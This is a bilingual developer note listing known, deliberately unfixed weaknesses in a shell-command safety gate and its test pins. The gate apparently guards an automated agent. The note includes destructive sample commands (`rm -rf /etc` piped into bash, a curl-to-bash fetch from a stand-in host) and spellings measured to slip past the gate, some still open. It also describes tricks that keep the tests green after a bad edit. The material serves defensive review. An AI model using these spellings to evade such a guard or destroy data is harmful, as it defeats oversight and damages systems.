# Known residuals — measured, deliberately unfixed

這個檔案是給**下一個審查者**看的，不是給使用者看的。

下面四項都經過實測、都是既有殘留、都刻意沒修。如果一次 review 又「發現」它們，
那是重複勞動——先讀這裡的理由，再決定要不要推翻它。

R1–R3 各有 `test-better-rm.sh` 裡的一個測試釘著，而且那個測試是**雙向**的：
文字不見了會紅，**底下的程式碼事實變了也會紅**。第二半是重點——它逼著「修好了
卻忘了刪這段文字」變成一次失敗，而不是一段悄悄過期的謊。

This file is for the **next reviewer**, not for users. All four items below are
measured, pre-existing, and deliberately unfixed. A review that "finds" them again
is repeating work already done — read the reasoning first, then decide whether to
overturn it. R1-R3 are each pinned by a test in `test-better-rm.sh`, and the pin is
**two-way**: it fails if the text disappears, and it also fails if the underlying
code fact changes. That second half is the point — it turns "fixed but forgot to
delete this note" into a failure rather than a quietly stale claim.

## 已知極限（實測，別高估這個釘子）

2026-08-19 的對抗驗收把這個釘子攻擊過一輪，**三個洞是量出來的，不是推測的**：

1. **抓不到原地否定。** 在下面插一句「以上作廢、重新開單」而不動任何 anchor，
   測試照樣綠。grep 型釘子的本質。
2. **抓不到把理由整段刪掉、只留 token。** 把 R1 的修法段落刪光、只在檔案結尾留
   一個孤零零的 anchor token（甚至塞在 HTML 註解或程式碼圍籬裡），照樣綠。
   **釘子看得到字串，看不到位置與上下文。**
   ⚠️ 所以**這份文件本身不得再出現任何 anchor token 的第二份字面拷貝**——寫這段
   警告的第一版就犯了這個錯（在這裡多寫了一次 R1 的 token），結果整個 R1 段落被
   刪掉時測試照樣綠。警告自己變成了它警告的那個洞。要提到 anchor 就描述它，別
   照抄它。這條現在由測試強制（每個 anchor 精確計數必須為 1），不再只是請求。
   ⚠️ 副作用要先知道：**R1–R3 是純中文的，哪天有人把它們鏡像成英文，anchor 就會
   出現第二次、釘子會紅。** 那不是誤報而是這條規則的直接後果——真要雙語就得同時
   改測試裡的 anchor 定義。
3. **程式碼那一半的「註解掉而不是刪掉」只補了一半。** 現在兩個程式碼 anchor 會先
   濾掉**行首**註解（`#` / `//`）再比對，所以那一種會紅。**其餘全都還是綠的**，
   實測：JS 的 `/* … */`（單行與跨行皆可）、bash 的 `: <<'EOF'` 區塊、把整行放進
   字串字面、bash 的 `if false; then … fi` 死碼包裹、以及**行尾註解**。
   ⚠️ 行尾註解那種最危險，因為它同時是「看起來已修好」的形狀：
   ```js
   const budgetMs = 9999;  // was: const budgetMs = 1000;
   ```
   `node --check` 過、釘子維持綠，**而預算已經被調大了**——正是 R3 明文說不要做的
   那個修法。bash 側同形：`:  # removed 2026-08-20: [ -O "$path" ] || return 1`。
   其餘同樣通得過的（實測，非推測）：bash 的 `:` no-op 前綴（`: [ -O … ] || return 1`，
   連註解都不用）、JS 的 `if (false) { … }`、以及把整行搬進一個沒人呼叫的函式裡
   ——最後這種看起來完全是活碼。
   **別把這半邊當成封死的。** 它擋的是最粗心的一種改法，不是有意的規避。

4. **精確計數本身有一個 BSD-only 的繞法：NUL 位元組 ＋ `LC_ALL=C`。** BSD `grep -o`
   碰到含 NUL 的檔案會印一行 `Binary file … matches`，於是 `wc -l` 永遠讀成 1，
   不論實際有幾份拷貝。實測完整攻擊（刪掉整個 R1 段落 ＋ 留兩個孤立 token ＋ 種一個
   NUL）在 `LC_ALL=C` 下 **136/136 全綠**。
   需要**同時**滿足兩個條件才成立：把 markdown 蓄意弄成二進位檔，且跑在 C/POSIX
   locale。少任一個都會紅（同攻擊無 NUL → 紅；有 NUL 但 UTF-8 locale → 紅）。
   ⚠️ **「git 會顯示成 binary 所以 review 看得到」這句話原本寫錯了，已更正**：
   git 只檢查**前 8000 bytes**，本檔已超過一萬 bytes，所以 NUL 塞在**檔尾**會得到
   一般文字 diff（實測 `numstat 4 24`），塞在**開頭**才會顯示 `- -`。攻擊者當然
   放檔尾。**這個繞法沒有「review 一定看得到」這道保險。**
   另一個當初寫錯的細節：control-2（NUL ＋ UTF-8 locale）之所以紅，機制與原本
   假設不同——ASCII 那個 anchor 仍數到 1，是兩個中文 anchor 讀成 0 才紅的。
   驗證腳本：`test/residual-harness/pin-nul-evasion.sh`（會把兩種放置位置都量）。
   ⚠️ CI 是 ubuntu（GNU grep），本機沒有 GNU grep 可測，**那一側的行為是推論不是實測**。

還有一個環境陷阱：兩個程式碼 anchor 用的是 `grep -v … | grep -q …`，在 `better-rm`
上前段會提早 SIGPIPE，整條管線回 141。這個測試檔目前沒開 `pipefail` 所以無害，
但**哪天有人給這套加上 `set -o pipefail`，這個釘子會永久變紅**。

還有一個已知的假陽性：對 `[ -O ]` 做語意不變的改寫（例如換個等價寫法）會讓釘子
變紅，而診斷訊息會說「已不在活碼裡」——方向是安全的（寧可誤報），但那句話當下
是錯的。看到它請直接看程式碼，別信訊息字面。

Stated limits, all measured on 2026-08-19: a prose pin catches deletion but not
in-place negation (1), and not wholesale removal of the reasoning as long as the
token survives anywhere in the file (2). The code-side half was ALSO defeatable by
commenting the line out rather than deleting it, and that is only **half** closed
(3): line-leading `#` / `//` now fails the pin, but everything else still satisfies
both code anchors, measured green — a JS `/* … */` block (single- or multi-line),
a bash `: <<'EOF'` block, the line inside a string literal, an `if false; then … fi`
wrapper, and **a trailing comment**. The trailing-comment form is the dangerous one
because it is also the shape a wrong fix takes: `const budgetMs = 9999;  // was:
const budgetMs = 1000;` passes `node --check`, keeps the pin green, and has raised
the budget — exactly what R3 says not to do. Do not read the code-side half as
sealed; it catches the careless edit, not the deliberate one.
One known false positive: a semantics-preserving rewrite of the ownership clause
trips the pin with a diagnostic that is then literally wrong.

---

## R1 — 日誌綁定檢查是 TOCTOU-racy（same-UID）

`log_file_is_bound()` 驗的是**路徑**：`[ -L ]` / `[ -f ]` / `[ -O ]` / link 數
都對路徑做，通過之後 `log_deletion` 才用同一個路徑去 append。兩者之間有窗口，
並行行程可以把 symlink 換進來，append 就跟著走過去。

**實測命中率隨 harness 的積極程度大幅變動**，這是 TOCTOU 的正常現象。三組獨立
harness 量到的範圍：**7.3% / 8.0% / 28.7%(43/150) / 50.7%(76/150) / 72.0% / 96.7%**
（2026-08-18 與 08-19，皆為同 UID racer）。
**所以任何單一數字都只描述那個 harness，不描述這個洞的難度**——別把 43/150 當成
上限，也別當成下限。要判斷風險請看前提條件，不是看比率。

**為什麼不修**：目前 state dir 是 0700、使用者自有，攻擊者要先有同 UID 的執行
能力——那個前提下他本來就能直接改日誌。風險真正上升的情境是
`BETTER_RM_STATE_DIR` 被指到共用位置。

**要修的話，正確方向是**：用 `O_NOFOLLOW|O_APPEND` 開一次，然後驗**那個 file
descriptor**（`fstat` 比對 mode / uid / nlink），全程用同一個 fd append。
**再加一道路徑檢查是沒有用的**——那只是把窗口變窄，不是關掉。

在 stock `/bin/bash` 3.2.57 上 `{fd}>>` 不可用、`/dev/fd/N` 讀出來是 mode 200，
所以純 bash 大概做不到；真要做需要一支小 helper。這是它沒被順手修掉的原因。

---

## R2 — `[ -O ]`（擁有者）那一條無法在無 root 的情況下測試

四個 clause 裡，`[ -L ]`（symlink）、`[ -f ]`（一般檔／FIFO 無限 hang）、
link 數（hard link）都有會紅的測試。**`[ -O ]` 沒有**：把它刪掉，整套
`test-better-rm.sh` 照樣全綠。

⚠️ **這句自 `5e295ef` 起不再字面成立**：那個 commit 教會釘子去 grep 活碼，所以刪掉
`[ -O ]` 現在會讓**釘子**變紅。但**行為覆蓋依然是零**——紅的是「文件與程式碼不同步」
那條，不是任何真的行使 ownership 的測試。驗證腳本會把這個差別分成 `CAUGHT`
（真有行為測試抓到）與 `PIN-ONLY`（只有釘子叫）兩種判定，`[ -O ]` 是後者：
`test/residual-harness/mutants-log-binding.sh`。

⚠️ **同一支腳本查出一個新的、更值得注意的缺口**（2026-08-20，尚未修）：把
`[ -f "$path" ] || return 1` 收窄成 `[ ! -p "$path" ]`（也就是「只擋 FIFO」的
trimmed 版本）**逃過全部 136 個測試**。可觀察的後果是**一個 socket 被當成合法日誌
靜默接受**。原因是 FIFO 那個測試釘的是「不會卡住」，不是「必須是一般檔」。
要修得在 `test-better-rm.sh` 加一個 socket fixture；本輪刻意不動既有測試檔，故記錄不修。

**為什麼沒補測試**（經獨立重新推導，不是採信）：

- `chown` 給 nobody／daemon／uid 1／65534 全部 EPERM。
- 但**「別的 UID 擁有的檔案」本身做得出來**：`ln /etc/hosts <0700 state dir>/deletion.log`
  回 0，得到一個 root 擁有、regular、就在使用者自有目錄裡的檔案。早先版本說這
  「寫不出來」是**錯的**。
- 真正做不出來的是 **`nlink == 1` 的那一種**。hardlink 必然 `nlink >= 2`，所以
  這條路徑會被 link 數那一條擋掉——**把 `[ -O ]` 整條刪掉，同一個 fixture 產生的
  輸出逐字相同**（實測：shipped 與 noO 兩版都印同一句拒絕訊息）。
- 順帶更正一個容易寫反的細節：shipped 的檢查順序是 `[ -L ]`→`[ -f ]`→`[ -O ]`→link 數，
  所以 hardlink fixture 實際上是**先被 `[ -O ]` 擋下**的。這不影響結論——重點是
  刪掉 `[ -O ]` 之後 link 數那條會擋下同一個 fixture，所以它觀察不到差別。

**結論成立、機制別寫反**：hardlink 路線無法偵測 `[ -O ]` 是否還在，不是因為
nlink 先觸發，而是因為兩條 clause 對這個 fixture 給出相同結果。

**處置：已知不可測、接受。** 不要為了讓覆蓋率好看去硬寫一個測不到真實條件的
測試——那種測試的唯一效果是讓下一個人以為這裡有防護。

---

## R3 — `test-hooks.js` 的 1000ms 預算是負載敏感的（兩邊都紅是常態，不是回歸）

`test-hooks.js` 裡 `const budgetMs = 1000;` 那段用牆鐘時間斷言 6000 個 `-exec`
子句仍在預算內被拒絕。**在負載下它會紅。**

**2026-08-18 實測**：12 個 spinner 下，`88e6611` 與 `ca02eca` **兩個 commit 都
3/3 紅**（1185/1606/1280ms vs 1213/1117/1118ms），而 `test-hooks.js` 在兩個
commit **逐位元組相同**。閒置時兩邊都綠。

**所以：這是負載相依、對稱、既有的問題。不要歸因給任何近期改動。** 這一點被三
份獨立報告各自誤判過一次，才由第四次獨立查證釐清。

**為什麼還沒修**：它在 pre-push gate 裡是真的負債（會隨機擋住推送），但正確修法
是換成不看牆鐘的寫法（例如比較有／無 padding 的相對成本，或直接斷言解析複雜度
上界），不是把 1000 改大——那只是把翻紅的負載門檻往上移。

## R4 — carrier 的腳本從 pipe 或 process substitution 進來時，不會被掃描
## （2026-09-03 CLOSED-WITH-EXCEPTION-LIST；剩下的部分改列為 R4-b）

**原本的問題**（2026-09-03 實測，全部放行，走真正的 stdin 進入點，payload 是 touch 不是
刪除，標記檔在 /bin/bash 3.2.57 與 5.3.15 下都出現，所以這些命令是真的會執行）：

```
echo "rm -rf /etc" | bash
printf %s "rm -rf /etc" | sh
echo rm -rf /etc | sudo bash
echo "rm -rf /etc" | bash -s
echo "rm -rf /etc" | tee /dev/null | bash
echo "rm -rf /etc" | source /dev/stdin
bash <(echo "rm -rf /etc")
curl -sSL https://example.invalid/install.sh | bash
```

對照組：逐位元組等價的 heredoc 寫法 `cat <<EOF | bash` 是**拒絕**的，here-string 寫法
`bash <<< "rm -rf /etc"` 也是。差別只在腳本從哪裡進來。

**裁決與修法**：使用者於 2026-09-03 裁決採用那條成立的規則，並附一份豁免清單
（FOLLOWUP.md 決定 1）。規則是：**carrier 的腳本從 pipe 或 process substitution 進來時，
這道閘門必須讀得到它，否則拒絕執行**。讀得到的只有兩種產生器——字面產生器
（`echo`／`printf` 的非動態字、`cat <<EOF`，其文字會當成巢狀命令判定）與
`hooks/protect-important-paths.js` 裡 `PIPED_SCRIPT_EXCEPTIONS` 上的網址前綴；
其餘一律拒絕，**包含解析器分類不出來的產生器**（沒有 fail-open 的分支）。
上面八列現在全部是拒絕，README.md 記載的四條安裝路徑仍然放行。

**這條規則新擋掉什麼，明講**：其他專案的 `curl … | sh` 一行安裝法、`cat script.sh | bash`、
`echo "$cmd" | bash`、中繼段（`… | tee f | bash`、`… | sed … | bash`）、
`source <(kubectl completion bash)` 這類 completion 慣用寫法，以及 `( … ) | bash` 這種
複合產生器。清單與繞法寫在 README.md「從 pipe 或 process substitution 進來的腳本會被拒絕」
那一節，訊息本身也會寫。

**豁免清單的性質，明講**：它比對的是命令列上的網址文字，不是身分驗證——任何能寫命令的人都
能寫出那個前綴，閘門也無法驗證伺服器回什麼。它的職責只是不讓這條規則擋掉本專案自己記載的
安裝方式。收窄條件（單一網址操作元、拒絕 `..`／百分號逃逸、選項白名單）記在 README.md 與
`hooks/protect-important-paths.js` 的常數註解裡，理由是實測：`--connect-to`／`--resolve`／
`--proxy`／`--unix-socket`／`-K`／`-o` 都能在網址文字逐位元組相符的情況下把抓取搬到別處。

**雙向釘**：`test-hooks.js` 的 `pipedScriptBlocked`／`exceptionListControls`（走真正的 stdin
契約，並斷言拒絕理由的文字含 `unscannable piped script` 與 `PIPED_SCRIPT_EXCEPTIONS`）、
`installRouteAllowances`（四條記載的安裝路徑，並比對 README.md 真的有這四條），以及
`blocked`／`allowed` 裡的字面產生器與誤擋對照列。規則消失、訊息爛回舊措辭、或豁免清單被放寬
成裸 host，這三件事各自會讓測試轉紅。

**R4 — closed with an exception list, 2026-09-03.** A shell carrier whose script
arrives on a pipe or through a process substitution is refused unless this gate
can READ that script: a literal emitter (`echo`/`printf` words, `cat <<EOF`) is
scanned as a nested command and judged by the ordinary rules, an install route on
`PIPED_SCRIPT_EXCEPTIONS` is let through, and everything else -- including a
producer the parser cannot classify -- is refused with a message that names the
rule (`unscannable piped script`) and the list to extend. All eight spellings
above, measured ALLOW that morning through the real stdin entry point with the
deletion replaced by a touch, are refused now; the four install routes README.md
documents still pass. The exception list matches URL TEXT and is not an identity
check, which is why an exempted fetch may carry only options that cannot move it.

## R4-b — 這條規則刻意沒有涵蓋的部分

以下每一列都是 2026-09-04 走真正的 stdin 進入點量出來的**放行**，不是推論：

- `bash < script.sh`、`bash script.sh`——重導向或操作元指向真正的檔案。
- `bash -c "$(curl …)"`、`eval "$(curl …)"`——**只在沒有 pipe 餵著時**。有 pipe 的
  `curl … | bash -c "$(cat)"` 從 2026-09-04 起是拒絕的。
- ~~`… | xargs -I{} bash -c "{}"` 與 `… | xargs -0 bash -c`~~ — **2026-09-05 已修，不再是殘留**。
  `-c` 的命令字串是 xargs 從 pipe 補上去的，這道閘門看到的 `-c` 後面根本沒有字（或只有一個
  `{}` 佔位符），於是 R4 的管線規則把腳本當成「看得見」而放行。修法：走過 xargs 抵達 carrier
  時，`-c` 沒有引數、或引數含有 xargs 的替換字串，就算「腳本從 stdin 進來」，與 `| bash` 走同
  一條規則——產生器讀得出來就照讀（`echo hi | xargs -0 bash -c` 仍然放行），讀不出來就拒絕。
  **實測（marker 檔，BSD xargs，bash 5.3.15 與 3.2.57）**：`-0 bash -c`、`-0 sh -c`、
  `-I{} sh -c '{}'`、`-I{} bash -c '{}'`、`-0 -- bash -c`、`-P4 -0 bash -c`、`-0 zsh -c`
  七種真的會執行 payload。**另外三種不會照原樣執行**：裸的 `| xargs bash -c`、`| xargs -L1
  bash -c`、`| xargs -n1 sh -c`——沒有 `-0` 時 xargs 依空白切開，第一個字成了 `-c` 的腳本、其餘
  成為 `$0`、`$1`，多字 payload 不會照寫的樣子跑（沒有產生 marker）。**它們照樣拒絕，而理由也
  是量出來的**：把 payload 換成「單一個字」（一個腳本檔路徑），這三種全部真的執行了它——腳本
  一樣來自 stdin、一樣讀不到。「腳本從 stdin 來就拒絕」是一條規則；「除非 xargs 的空白切割會
  把這個特定 payload 弄壞」得再建模一次 xargs 的切字規則才會是真的。
  仍然允許的是 `-c` 的腳本寫在命令列上、又沒有替換字串會改寫它的寫法
  （`echo … | xargs -0 bash -c 'echo hi'`，實測不會執行 payload）。
  **2026-09-05 第二輪：連 xargs 的「選項表」一起補正（R5-14）。** 上面那條規則靠「走過選項找
  命令字」運作，所以吃錯字數就會走過 shell。兩類都錯、都 fail-open：GNU 的
  `-i[replace-str]`／`-e[eof-str]`／`-l[max-lines]`（含 `--replace[=…]`／`--eof[=…]`／
  `--max-lines[=…]`）引數是「選填且相連」，裸寫不吃字，卻被當成吃下一個字——
  `… | xargs -i sh -c '{}'` 因此吞掉 `sh`、停在 `-c`、找不到 carrier 而放行；BSD 的
  `-J replstr`／`-R replacements`／`-S replsize` 與 GNU 的 `--process-slot-var` 根本不在表裡，
  走訪停在它們的值上。後三者**在本機用 marker 實測真的會執行 stdin 送進來的腳本**
  （`-R 3 -I{} sh -c '{}'`、`-S 5000 -I{} sh -c '{}'`、`-J % -I{} sh -c '{}'`，
  bash 5.3.15 與 3.2.57 皆同），而且原本全部放行；`xargs -t -J % sh -c %` 對 stdin 的 `hi`
  印出 `sh -c hi`，stdin 那一行就是腳本本身。GNU 的文法對照 findutils 手冊，本機沒有 GNU
  xargs、也依 SAFETY 不安裝；BSD 直接拒絕 `-i`／`-e`／`-l`（實測 `invalid option`），所以兩邊
  都是 fail-closed。讓整族現形的不對稱：相連寫法 `--replace={}` 語意相同，卻一直是拒絕的。
- `bash <&3`——fd 3 由別處開啟，而且不是 process substitution 開的。
  `bash /dev/fd/3 3< <(curl …)` 與 `exec 3< <(curl …); bash /dev/fd/3` 那一族已於
  2026-09-04 納入。
- `curl … > >(bash)`——輸出方向的 process substitution，刻意不視為腳本來源。
- `curl … | busybox sh`、`| python3`、`| perl` 等非 shell（或還要再拆一層 applet）的消費端。

使用者的裁決指名的是 pipe 與 process substitution，而豁免機制是網址形狀而不是路徑形狀；
把檔案與 fd 那一族納入是另一次姿態改變，範圍大得多（每一個 `bash < f` 都會被擋），該分開問。

**代價，明講而不是藏著**：`cat f | bash` 被拒，而只差一個字元的 `bash < f` 沒有。知道規則的
人繞得過去，所以 R4 買到的是「閘門不再對一種常見寫法視而不見」，不是「對手拿不到執行」。

**「腳本文字看得見、但裡面的命令替換看不見」這一類，涵蓋到哪裡為止**（實測，不是推論）：
carrier 自己的 here-string 與 heredoc 內文（`bash <<< "$(curl …)"`、`bash <<EOF` 內文寫著
`$(curl …)`）、字面 heredoc 產生器的內文（`cat <<EOF | bash` 內文寫著 `$(curl …)`），以及
**有 pipe 餵著時**的 `-c` 引數（`curl … | bash -c "$(cat)"`，2026-09-04 補上）都會拒絕；
良性的 `bash <<EOF` + `echo hi` 仍然放行。

**這裡先前寫著「兄弟站點已全部納入」，那句話是假的，已刪除**：寫下它的當天
`curl … | bash -c "$(cat)"` 是放行的，而它正是同一類的兄弟站點（腳本文字看得見、裡面的替換
看不見），2026-09-04 才補上。範圍外的部分改成下面那份逐列量過的清單，不再用「全部」這種詞。

**R4-b — deliberately out of scope.** `bash < file`, `bash script.sh`,
`bash -c "$(curl …)"`, `eval "$(curl …)"`,
`bash <&3`, and non-shell consumers such as `curl … | python3`.
**The `xargs` carrier family that used to head this list was FIXED on 2026-09-05 and
is no longer a residual.** xargs supplies the `-c` script from stdin, so the gate saw
a `-c` with no argument at all (or with nothing but a `{}` placeholder) and called
the script visible. Now a carrier reached THROUGH xargs whose `-c` has no argument,
or whose argument contains xargs' replace string, is treated as "the script comes
from stdin" and goes through the same rule `| bash` does: a producer this gate can
read is read (`echo hi | xargs -0 bash -c` stays allowed), and one it cannot is
refused. Measured with marker files under BSD xargs on bash 5.3.15 and 3.2.57, seven
spellings really execute the payload (`-0 bash -c`, `-0 sh -c`, `-I{} sh -c '{}'`,
`-I{} bash -c '{}'`, `-0 -- bash -c`, `-P4 -0 bash -c`, `-0 zsh -c`). Three more do
NOT run a multi-word payload as written -- bare `| xargs bash -c`, `| xargs -L1
bash -c` and `| xargs -n1 sh -c` split stdin on whitespace, so the first word becomes
the `-c` script and the rest become `$0`, `$1` … -- and they are refused all the same,
for a measured reason: with a SINGLE-word payload (a script file path) all three
really do execute it, so the script still arrives from stdin and this gate still
cannot read it. What stays allowed is a `-c` script written on the command line that
no replace string can rewrite (`echo … | xargs -0 bash -c 'echo hi'`, measured not to
execute the payload).
**Second pass on 2026-09-05: xargs' OPTION TABLE itself (R5-14).** That rule finds
the command word by stepping over options, so an entry that eats the wrong number of
words walks straight past the shell. Two families were wrong, both fail-open: GNU's
optional-argument options -- `-i[replace-str]`, `-e[eof-str]`, `-l[max-lines]` and
`--replace[=…]`, `--eof[=…]`, `--max-lines[=…]`, where the argument is optional AND
attached, so a bare `-i` consumes nothing -- were modelled as taking a separate word,
which made `… | xargs -i sh -c '{}'` swallow `sh`, land on `-c`, find no carrier and
ALLOW; and BSD's `-J replstr`, `-R replacements`, `-S replsize` plus GNU's
`--process-slot-var` were missing from the table entirely, so the walk stopped on
their value. The last three are not theoretical: measured on this host with a marker
file under bash 5.3.15 and /bin/bash 3.2.57, `-R 3 -I{} sh -c '{}'`,
`-S 5000 -I{} sh -c '{}'` and `-J % -I{} sh -c '{}'` all really executed a payload
arriving on stdin, and all three were ALLOWED; `xargs -t -J % sh -c %` prints
`sh -c hi` for a `hi` on stdin, so the stdin line becomes the script itself. GNU's
grammar was checked against the findutils manual and could not be executed here
(no GNU xargs on this host, and SAFETY forbids installing one); BSD xargs rejects
`-i`, `-e` and `-l` outright (`invalid option`, measured), so refusing them is
fail-closed on both platforms. The asymmetry that exposed the family: the attached
`--replace={}`, identical in meaning, was refused all along. The decision named
pipes and process substitutions, and the exemption mechanism is URL-shaped rather
than path-shaped; folding in the file/fd family is a second, much larger posture
change and should be asked separately. Every item above was measured ALLOW on
2026-09-04 through the real stdin entry point; none of them is reasoned about.
"The script text is visible but a command substitution inside it is not" is
covered on the carrier's own here-string and heredoc body (`bash <<< "$(curl …)"`,
`bash <<EOF` with `$(curl …)` in it), on a literal heredoc producer's body
(`cat <<EOF | bash` with `$(curl …)` in it) and, since 2026-09-04, on the `-c`
argument of a PIPE-FED carrier (`curl … | bash -c "$(cat)"`), while the benign
`bash <<EOF` / `echo hi` twin stays allowed. This paragraph used to claim those
sibling sites were ALL covered; that sentence was false when it was written --
`curl … | bash -c "$(cat)"` was allowed at the time and is the same class -- and
it is deleted rather than softened, because a residuals document that overstates
its own coverage is the one thing this file exists to prevent.

## R4-c — carrier 選項的「吃掉下一個字」只覆蓋 bash/sh 系的拼法

`hooks/protect-important-paths.js` 的 carrier argv 走訪會吃掉 `-O`／`+O`／`-o`／`+o`／
`--rcfile`／`--init-file` 的引數（判斷是 `/^[-+][A-Za-z]*[Oo]$/` 加那兩個長選項），涵蓋
`bash --help` 的 invocation-only 那一整組，以及 sh／dash／zsh／ksh 的 `-o`。**fish 自己那組
帶引數的選項不在內**：實測 2026-09-04，`curl -sSL <url> | fish -d 3` 與 `| fish --debug 3`
都是**放行**，因為 `3` 被讀成腳本檔操作元；同一條命令去掉那個選項（`curl … | fish`）是拒絕。

**為什麼不順手修**：正確的修法不是再往那條形狀正則裡多塞幾個字串，而是每個 carrier 各有一份
「會吃掉下一個字」的選項表——那是一份會隨上游漂移的資料，每加一個名字都得配一列實測的測試，
而且加錯方向（少吃一個字）就是一個新的 fail-open。fish 在這台機器上不是 login shell，
`~/bin` 與 launchd 也沒有任何 `| fish` 的用法，所以這一項留著並寫下來，不假裝已經涵蓋。

**R4-c — the option-argument walk covers the bash/sh spellings only.** The carrier
argv walk consumes the argument of `-O`/`+O`/`-o`/`+o`/`--rcfile`/`--init-file`,
which is the whole invocation-only group in `bash --help` plus the `-o` of
sh/dash/zsh/ksh. fish's own argument-taking options are NOT covered: measured
2026-09-04, `curl -sSL <url> | fish -d 3` and `| fish --debug 3` are ALLOWED,
because `3` is read as the script FILE operand, while the same command without the
option (`curl … | fish`) is refused. The right fix is a per-carrier table of
options that consume the next word -- upstream-drifting data that needs a measured
row per name, where getting it wrong in the consuming direction is a new fail-open
-- and fish is not a login shell on this machine and nothing in `~/bin` or launchd
pipes into it, so this is written down rather than pretended away.


## R5-a — 斷詞階段的 `$(` 平方級成本 — 2026-09-05 **CLOSED**（線性化，沒有上輸入長度上限）

判定預算（`JUDGING_BUDGET_MS = 2000`）是在 `commandTargets()` **之後**才設 deadline 的，
所以**斷詞本身不在預算內**。2026-09-04 補上的失敗讀取預算
（`MAX_FAILED_SUBSTITUTION_READS = 64`）只封住 `shellWords()` 裡那三個雙引號內的 reader，
`$(` 那一半留了下來。

**成本先歸因、再修**（用加了計數器的複本量，不是猜）：16KB 的 `echo "` + `$(`×n + `" ; rm -rf
/etc` 這個形狀，tokenizer 只花掉它的 64 次失敗讀取（預算本來就在作用），而
`commandSubstitutions()` 失敗了 **8,192 次、掃了 3,370 萬個字元**——成本整份在那裡。未加引號
的雙胞胎則是兩個站點各 8,192 次，所以它的時間剛好是引號版的兩倍。

**修法**：把同一份失敗讀取預算加到剩下的三個站點——tokenizer 的「頂層」`$(` 臂（與已經有預算
的引號內那個臂共用同一個計數器），以及 `commandSubstitutions()` 的 `$(` 與 `<(`／`>(` reader
（那個函式自己一份，因為它是在斷詞之後重讀原始文字，tokenizer 的計數器碰不到它）。
**沒有上輸入長度上限**：使用者 2026-09-05 的裁決是先讓掃描變線性，只有做不到才回頭考慮上限。

實測（走真正的 stdin 進入點，命令是 `echo "` + `$(`×n + `" ; rm -rf /etc`，以及它未加引號的
雙胞胎；arm64 = 本機 node 26.8.1，x86_64 = node 22.17.0，也就是 CI 跑的架構）：

| 形狀 | 16KB | 32KB | 64KB | 128KB |
|---|---|---|---|---|
| 引號內，修復前（arm64） | 382ms | 1,428ms | 5,678ms | — |
| 引號內，修復後（arm64） | 48ms | 60ms | 83ms | 130ms |
| 未加引號，修復前（arm64） | 820ms | 2,870ms | 11,458ms | — |
| 未加引號，修復後（arm64） | 56ms | 74ms | 113ms | 173ms |
| 引號內，修復前（x86_64） | 758ms | 2,624ms | 9,103ms | 38,557ms |
| 引號內，修復後（x86_64） | 159ms | 177ms | 215ms | 306ms |
| 未加引號，修復前（x86_64） | 1,409ms | 4,788ms | 15,818ms | 80,591ms |
| 未加引號，修復後（x86_64） | 205ms | 235ms | 276ms | 407ms |

每一格的裁決都是**拒絕**，而且拒絕的理由是「受保護的目錄 /etc」而不是「時間用完」——後者代表
閘門是停止讀取，而不是讀完了。`<(` 那個兄弟站點自己也是平方級（arm64 修復前 16KB 785ms、
32KB 2,965ms），共用同一份預算。

**釘住它的是「次數」不是毫秒**：`shellWords()` 與 `commandSubstitutions()` 各自把
`failedSubstitutionReads` 掛在回傳值上，測試斷言「剛好停在上限」與「輸入加倍不會多買到任何
一次失敗讀取」。牆鐘斷言在這條路徑上量的是主機負載（R4-5 的教訓）。

**代價，明講而不是藏著**：超過上限之後，「本來讀得完」的 `$(` 不再被讀出來，它的內文也就不會
被掃。

> **這一段原本是錯的，而且錯得會出人命（R5-13，2026-09-05 已修）。** 原文寫著「要走到那一步，
> 輸入裡得有 64 個一路到結尾都不收尾的開頭，而那在本檔案建模的每一種 shell 裡都是語法錯誤
> （`bash -n` 會拒絕），所以走到上限的命令不是會執行的命令」。**反例就在同一個函式裡**：未加
> 引號的 heredoc 內文是「刻意」留在 `scannable` 裡的（因為那裡的替換是真的會展開），所以那段
> 文字對這道閘門是要掃的程式碼、對 bash 只是資料。heredoc 內文裡的 64 個 `$(` 完全不是語法錯
> 誤——`bash -n` 接受，bash 執行時只印一則非致命的 `bad substitution: no closing )`，然後繼續
> 跑下一行。實測（r5-validate-better-rm-7，bash 5.3.15、/bin/bash 3.2.57、/bin/sh，用真的目
> 標）：`cat <<EOF` + 64 個 `$(` + `EOF` + `echo $(rm -rf /etc)` **被放行而且真的刪掉了**，63
> 個是拒絕、64 個是放行。六種拼法（`<(` 版、`<<-`、`cat <<EOF | wc -l`、40+40 混合、
> `cat > notes.txt <<EOF`）全部相同。
>
> **通則，寫下來免得再犯**：任何「bash 當成字面資料、而這道閘門仍然會掃」的脈絡，都是「掃得
> 到但不是語法」的文字，所以本檔案不可以再拿「那樣寫會是語法錯誤」當作某個狀態不可能發生的
> 論據。

**現在的行為（R5-13）**：任何一份失敗讀取預算被用完，整條命令就以自己的 sentinel
（`SUBSTITUTION_BUDGET_EXHAUSTED`）與自己的規則名（`substitution budget exhausted`）**拒絕**，
與 `UNREADABLE_TRAP_ACTION`／`UNJUDGEABLE_ENV_S` 同一套規矩，訊息裡帶著「有幾個開頭讀不出
來」。預算仍然只是「少做那一次讀取」（成本上限不變，時間表沒有退步），改變的只是「少讀了」不
再等於「當作讀過了」。

**新的代價，同樣明講**：一條真的帶了 64 個讀不出來的開頭、而且其實沒有刪除的命令，現在也會被
拒絕——閘門分不出這兩者，這正是重點。價錢的上界在測試裡釘著：同樣形狀、十個開頭照樣放行；人
手寫得出來的東西都落在放行那一側。另外，`$(` 填充多到把預算花完的那幾列，拒絕理由會從「受保
護的目錄 /etc」變成「substitution budget exhausted」（4,378 列語料裡有 106 列，全都是
deny→deny）；在預算用完之前就找到的受保護路徑仍然由它決定訊息。

**先前記在這裡、仍然成立的兩件事**：（a）審查報告建議的 `noCloserBeyond` 記憶化是**不成立的**
——拿這個檔案自己的 `readBraced` 反證，輸入 `${${}` 時 `readBraced(.,1)` 回 `null` 而
`readBraced(.,3)` 回 `4`，後面的開頭可以收尾、前面的卻不能，**不要照那個處方實作**；
（b）如果哪天真的要上輸入長度上限，實測數字是修復前最壞形狀 16KB 746ms、32KB 2,883ms、
64KB 12,363ms，判定預算最多再加 2,000ms——但線性化之後這條路沒有必要走。

**R5-a — the `$(` quadratic in the tokenizing phase — CLOSED 2026-09-05, made linear
without an input-size cap.** The judging budget's deadline is set AFTER
`commandTargets()`, so tokenizing is outside it, and the failed-read budget added
2026-09-04 (`MAX_FAILED_SUBSTITUTION_READS = 64`) bounded only the three
in-double-quote readers in `shellWords()`.
**The cost was ATTRIBUTED before anything was changed**, with a counter on an
instrumented copy rather than a guess: for 16 KB of `echo "` + `$(` x n +
